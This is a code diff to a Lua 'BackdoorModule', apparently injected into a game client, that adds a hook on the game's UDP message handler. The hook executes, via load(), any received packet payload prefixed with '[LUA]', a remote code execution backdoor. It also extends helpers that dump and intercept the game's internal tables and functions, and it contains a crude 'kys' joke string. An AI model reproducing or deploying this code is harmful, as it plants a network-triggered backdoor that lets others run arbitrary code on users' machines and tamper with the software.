@@ -54,14 +54,18 @@ BackdoorModule.log = function(mode,...)
 end
 
 -- deep dumps the contents of the table and it's contents' contents
-BackdoorModule.deepdump = function(tbl,outputFunc)
-    outputFunc = outputFunc or function(...) BackdoorModule.log("Trace", ...) end
+BackdoorModule.deepdump = function(tbl,excludeTables, outputFunc)
+    outputFunc = outputFunc or function(...) BackdoorModule.log("DeepDump", ...) end
     local checklist = {}
     local function innerdump( tbl, indent )
         checklist[ tostring(tbl) ] = true
         for k,v in pairs(tbl) do
-            outputFunc(indent..k,v,type(v),checklist[ tostring(tbl) ])
-            if (type(v) == "table" and not checklist[ tostring(v) ]) then innerdump(v,indent.."    ") end
+            if excludeTables[k] ~= nil then
+                print("ExcludedTable")
+            else
+                outputFunc(indent..k,v,type(v),checklist[ tostring(tbl) ])
+                if (type(v) == "table" and not checklist[ tostring(v) ]) then innerdump(v,indent.."    ") end
+            end
         end
     end
     outputFunc("====== DEEP DUMP "..tostring(tbl).." =======")
@@ -120,6 +124,84 @@ end
 
 BackdoorModule.HookOutputFunctions()
 
+
+function RunCode(luaCode)
+    local compiledCode, errorMessage = load(luaCode)
+    if compiledCode then
+        compiledCode()
+    else
+        print("Error compiling Lua code: " .. errorMessage)
+    end
+end
+
+
+local obj, path = BackdoorModule.findObjectByName("Manager.SolarUDPManager_#1", _G)
+if obj then
+    print("GOT UDP MANAGER", table.concat(path, " -> "))
+    print("Jackpot")
+    excludeTables = {}
+    excludeTables.solarGameInstance = {}
+    obj.OnMessageReceived = FunctionHook:New(obj.OnMessageReceived, function(origOnMessageReceived, ...)
+        print("OnMessageReceived Args")
+        local argsTable = {...}
+        if argsTable[2] and argsTable[2]:Get(1) ~= 0 then
+            print("TARRAY Lentgh")
+            local ret = ""
+            for i=1, argsTable[2]:Length() do
+                ret = ret..string.char(argsTable[2]:Get(i))
+            end
+            if string.sub(ret, 1, 5) == "[LUA]" then
+                print(ret)
+                RunCode(string.sub(ret, 6))
+            end
+        end
+        local ret = {origOnMessageReceived(...)}
+        print("Returned arguments:")
+        for i = 1, #ret do
+            print(i, ret[i])
+        end
+        return table.unpack(ret)
+    end)
+else
+    print("Solar UDP not found")
+end
+
+_G.LMAO = {}
+_G.LMAO.VERYLONGPATH = {}
+_G.LMAO.VERYLONGPATH.ONG = {}
+_G.LMAO.VERYLONGPATH.ONG.FREEMYBROTHER = {
+    flag = "kys"
+}
+
+
+--[[
+local obj, path = BackdoorModule.findObjectByName("Manager.SolarNetworkManager_#1", _G)
+if obj then
+    print("GOT NetworkManager", table.concat(path, " -> "))
+    print("Jackpot")
+    obj.DecodeMsg = FunctionHook:New(obj.DecodeMsg, function(origDecodeMsg, ...)
+        print("DecodeMsg Args")
+        for i,v in pairs({...}) do
+            print(v)
+        end
+        local ret = origDecodeMsg(...)
+        if ret then
+            print("DecodeMsg Returns")
+            if type(ret) == "table" then
+                for i,v in pairs(ret) do
+                    print(v)
+                end
+            else
+                print(ret)
+            end
+        end
+        return ret
+    end)
+else
+    print("Solar UDP not found")
+end
+--]]
+--[[
 -- Function to convert a table to a string
 local function tableToString(tbl, indent)
     local str = "{\n"
@@ -145,11 +227,11 @@ end
 BackdoorModule.HookAllFuncs = function(tbl)
     for k,v in pairs(tbl) do
         if type(v) == "function" then
-            tbl[k] = FunctionHook:New(v, function(fn, ...)
+            tbl[k] = FunctionHook:New(tbl[k], function(fn, ...)
                 print(k.." Arguments : "..table.concat({...}, " -> "))
-                local ret = {fn(...)}
+                local ret = fn(...)
                 local retStr = {}
-                for i, val in ipairs(ret) do
+                for i, val in ipairs({ret}) do
                     if type(val) == "table" then
                         retStr[i] = tableToString(val, "  ")
                     else
@@ -157,36 +239,15 @@ BackdoorModule.HookAllFuncs = function(tbl)
                     end
                 end
                 print("Returned : ", table.concat(retStr, " ; "))
-                return table.unpack(ret)
+                return ret
             end)
         end
     end
 end
 
+
+--]]
 --BackdoorModule.deepdump(funnyTable)
-
-BackdoorModule.SpecialUDPManagerHook = function(tbl)
-    BackdoorModule.HookAllFuncs(tbl)
-    if tbl.Overridden then
-        print("Hooking Overriden Table")
-        BackdoorModule.HookAllFuncs(tbl.Overridden)
-    end
-end
-
--- this is the real jackpot fr 
-local obj, path = BackdoorModule.findObjectByName("Manager.SolarNetworkManager_#1", _G)
-if obj then
-    print("Object found at path: " .. table.concat(path, " -> "))
-    -- Now you can modify the object as needed
-    if obj.Overridden then
-        print("Jackpot")
-        BackdoorModule.SpecialUDPManagerHook(obj)
-    end
-else
-    print("Object not found.")
-end
-
-
 --[[
 -- example of hooking all functions inside a table
 funnyTable = {}
